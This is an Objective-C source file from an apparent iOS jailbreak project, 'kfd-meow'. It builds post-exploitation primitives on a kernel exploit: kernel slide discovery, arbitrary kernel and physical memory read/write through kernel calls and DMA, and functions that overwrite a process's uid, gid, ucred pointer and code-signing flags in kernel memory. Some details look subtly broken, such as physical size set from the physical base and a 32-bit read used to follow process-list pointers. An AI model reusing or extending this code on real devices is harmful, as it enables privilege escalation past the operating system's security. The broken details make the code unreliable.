//
//  libmeow.m
//  kfd-meow
//
//  Created by doraaa on 2023/12/17.
//

#include "libmeow.h"

uint64_t kernel_base = 0;
uint64_t kernel_slide = 0;

bool has_physrw = false;

uint64_t our_task = 0;
uint64_t our_proc = 0;
uint64_t kern_task = 0;
uint64_t kern_proc = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;

uint64_t gCpuTTEP = 0;
uint64_t gPhysBase = 0;
uint64_t gPhysSize = 0;
uint64_t gVirtBase = 0;

uint64_t data__gCpuTTEP = 0;
uint64_t data__gVirtBase = 0;
uint64_t data__gPhysBase = 0;

uint64_t add_x0_x0_0x40 = 0;
uint64_t container_init = 0;
uint64_t iogettargetand = 0;
uint64_t empty_kdata    = 0;
uint64_t mach_vm_alloc  = 0;
uint64_t trust_caches   = 0;
uint64_t ml_phys_read   = 0;
uint64_t ml_phys_write  = 0;
uint64_t pmap_enter_options  = 0;
uint64_t pmap_remove_options = 0;

void set_offsets(void) {
    kernel_slide = get_kernel_slide();
    kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
    our_task = get_current_task();
    our_proc = get_current_proc();
    kern_task = get_kernel_task();
    kern_proc = get_kernel_proc();
    our_ucred = proc_get_ucred(our_proc);
    kern_ucred = proc_get_ucred(kern_proc);
    gPhysBase = get_physbase();
    gPhysSize = get_physbase();
    
    printf("kernel_slide : %016llx\n", kernel_slide);
    printf("kernel_base  : %016llx\n", kernel_base);
    printf("our_task     : %016llx\n", our_task);
    printf("our_proc     : %016llx\n", our_proc);
    printf("kern_task    : %016llx\n", kern_task);
    printf("kern_proc    : %016llx\n", kern_proc);
    printf("our_ucred    : %016llx\n", our_ucred);
    printf("kern_ucred   : %016llx\n", kern_ucred);
    
    offsetfinder64_kread();
}

/*---- krw ----*/
uint64_t physread64(uint64_t pa) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

    u.u32[0] = (uint32_t)early_kcall(ml_phys_read, pa, 4, 0, 0, 0, 0, 0);;
    u.u32[1] = (uint32_t)early_kcall(ml_phys_read, pa+4, 4, 0, 0, 0, 0, 0);
    return u.u64;
}

void physwrite64(uint64_t pa, uint64_t val) {
    early_kcall(ml_phys_write, pa, val, 8, 0, 0, 0, 0);
}

void physreadbuf(uint64_t pa, void* ua, size_t size) {
    if(isarm64e()) {
        kreadbuf_kfd(phystokv_kfd(pa), ua, size);
    } else {
        uint64_t *v32 = (uint64_t*) ua;
        
        while (size) {
            size_t bytesToRead = (size > 8) ? 8 : size;
            uint64_t value = physread64(pa);
            pa += 8;
            
            if (bytesToRead == 8) {
                *v32++ = value;
            } else {
                memcpy(ua, &value, bytesToRead);
            }
            
            size -= bytesToRead;
        }
    }
}

void physwritebuf(uint64_t pa, const void* ua, size_t size) {
    if(isarm64e()) {
        dma_writevirtbuf(phystokv_kfd(pa), ua, size);
    } else {
        uint8_t *v8 = (uint8_t*) ua;
        
        while (size >= 8) {
            physwrite64(pa, *(uint64_t*)v8);
            size -= 8;
            v8 += 8;
            pa += 8;
        }
        
        if (size) {
            uint64_t val = physread64(pa);
            memcpy(&val, v8, size);
            physwrite64(pa, val);
        }
    }
}

uint64_t kread64(uint64_t va) {
    if(!isarm64e() && has_physrw) {
        return physread64(vtophys_kfd(va));
    } else {
        return kread64_kfd(va);
    }
}

uint32_t kread32(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u32[0];
}

uint16_t kread16(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u16[0];
}

uint8_t kread8(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u8[0];
}

void kwrite64(uint64_t va, uint64_t val) {
    if(has_physrw) {
        if(isarm64e()) {
            dma_writevirt64(va, val);
        } else {
            physwrite64(vtophys_kfd(va), val);
        }
    } else {
        kwrite64_kfd(va, val);
    }
}

void kwrite32(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u32[0] = val;
    kwrite64(va, u.u64);
}

void kwrite16(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u16[0] = val;
    kwrite64(va, u.u64);
}

void kwrite8(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u8[0] = val;
    kwrite64(va, u.u64);
}

void kreadbuf(uint64_t va, void* ua, size_t size) {
    uint64_t *v32 = (uint64_t*) ua;
    
    while (size) {
        size_t bytesToRead = (size > 8) ? 8 : size;
        uint64_t value = kread64(va);
        va += 8;
        
        if (bytesToRead == 8) {
            *v32++ = value;
        } else {
            memcpy(ua, &value, bytesToRead);
        }
        
        size -= bytesToRead;
    }
}

void kwritebuf(uint64_t va, const void* ua, size_t size) {
    if(isarm64e() && has_physrw) {
        dma_writevirtbuf(va, ua, size);
    } else {
        uint8_t *v8 = (uint8_t*) ua;
        
        while (size >= 8) {
            kwrite64(va, *(uint64_t*)v8);
            size -= 8;
            v8 += 8;
            va += 8;
        }
        
        if (size) {
            uint64_t val = kread64(va);
            memcpy(&val, v8, size);
            kwrite64(va, val);
        }
    }
}

uint64_t kreadptr(uint64_t va) {
    uint64_t ptr = kread64(va);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }
    
    return ptr;
}

/*---- proc ----*/
uint64_t proc_of_pid(pid_t target) {
    uint64_t proc_kaddr = get_kernel_proc();
    while (true) {
        int32_t pid = kread32(proc_kaddr + off_proc_pid);
        if (pid == target) {
            break;
        }
        proc_kaddr = kread32(proc_kaddr + off_proc_pre);
    }
    return proc_kaddr;
}

uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
    if(isAvailable() >= 10)
        return kread64(proc_ptr + 0x18);
    return kread64(proc_ptr + 0x20);
}

uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
    return kread64(proc_ro_ptr + 0x20);
}

void proc_ro_set_ucred(uint64_t proc_ro_ptr, uint64_t ucred_ptr) {
    return kwrite64(proc_ro_ptr + 0x20, ucred_ptr);
}

uint64_t proc_get_ucred(uint64_t proc_ptr) {
    if(isAvailable() <= 5)
        return kreadptr(proc_ptr + 0xd8);
    return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
}

void proc_set_ucred(uint64_t proc_ptr, uint64_t ucred_ptr) {
    if (isAvailable() <= 5)
        return kwrite64(proc_ptr + 0xd8, ucred_ptr);
    return proc_ro_set_ucred(proc_get_proc_ro(proc_ptr), ucred_ptr);
}

uint32_t proc_get_csflags(uint64_t proc) {
    if (isAvailable() <= 5)
        return kread32(proc + 0x300);
    uint64_t proc_ro = proc_get_proc_ro(proc);
    return kread32(proc_ro + 0x1c);
}

void proc_set_csflags(uint64_t proc, uint32_t csflags) {
    if (isAvailable() <= 5)
        return kwrite32(proc + 0x300, csflags);
    uint64_t proc_ro = proc_get_proc_ro(proc);
    return kwrite32(proc_ro + 0x1c, csflags);
}

uint32_t proc_get_uid(uint64_t proc_ptr) {
    return kread32(proc_ptr + 0x2c);
}

void proc_set_uid(uint64_t proc_ptr, uid_t uid) {
    return kwrite32(proc_ptr + 0x2c, uid);
}

uint32_t proc_get_ruid(uint64_t proc_ptr) {
    return kread32(proc_ptr + 0x34);
}

void proc_set_ruid(uint64_t proc_ptr, uid_t ruid) {
    return kwrite32(proc_ptr + 0x34, ruid);
}

uint32_t proc_get_gid(uint64_t proc_ptr) {
    return kread32(proc_ptr + 0x30);
}

void proc_set_gid(uint64_t proc_ptr, uid_t gid) {
    return kwrite32(proc_ptr + 0x30, gid);
}

uint32_t proc_get_rgid(uint64_t proc_ptr) {
    return kread32(proc_ptr + 0x38);
}

void proc_set_rgid(uint64_t proc_ptr, uid_t rgid) {
    return kwrite32(proc_ptr + 0x38, rgid);
}

uint32_t proc_get_svuid(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32(proc_ptr + 0x3c);
    return kread32(proc_ptr + 0x44);
}

void proc_set_svuid(uint64_t proc_ptr, uid_t svuid) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x3c, svuid);
    return kwrite32(proc_ptr + 0x44, svuid);
}

uint32_t proc_get_svgid(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32(proc_ptr + 0x40);
    return kread32(proc_ptr + 0x48);
}

void proc_set_svgid(uint64_t proc_ptr, uid_t svgid) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x40, svgid);
    return kwrite32(proc_ptr + 0x48, svgid);
}

uint32_t proc_get_p_flag(uint64_t proc_ptr) {
    if (isAvailable() <= 5)
        return kread32(proc_ptr + 0x1bc);
    return kread32(proc_ptr + 0x264);
}

void proc_set_p_flag(uint64_t proc_ptr, uint32_t p_flag) {
    if (isAvailable() <= 5)
        return kwrite32(proc_ptr + 0x1bc, p_flag);
    return kwrite32(proc_ptr + 0x264, p_flag);
}

uint32_t ucred_get_uid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32(cr_posix_ptr + 0x0);
}

void ucred_set_uid(uint64_t ucred_ptr, uint32_t uid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x0, uid);
}

uint32_t ucred_get_svuid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32(cr_posix_ptr + 0x8);
}

void ucred_set_svuid(uint64_t ucred_ptr, uint32_t svuid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x8, svuid);
}

uint32_t ucred_get_cr_groups(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32(cr_posix_ptr + 0x10);
}

void ucred_set_cr_groups(uint64_t ucred_ptr, uint32_t cr_groups) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x10, cr_groups);
}

uint32_t ucred_get_svgid(uint64_t ucred_ptr) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kread32(cr_posix_ptr + 0x54);
}

void ucred_set_svgid(uint64_t ucred_ptr, uint32_t svgid) {
    uint64_t cr_posix_ptr = ucred_ptr + 0x18;
    return kwrite32(cr_posix_ptr + 0x54, svgid);
}

uint64_t ucred_get_cr_label(uint64_t ucred_ptr) {
    return kread64_ptr_kfd(ucred_ptr + 0x78);
}
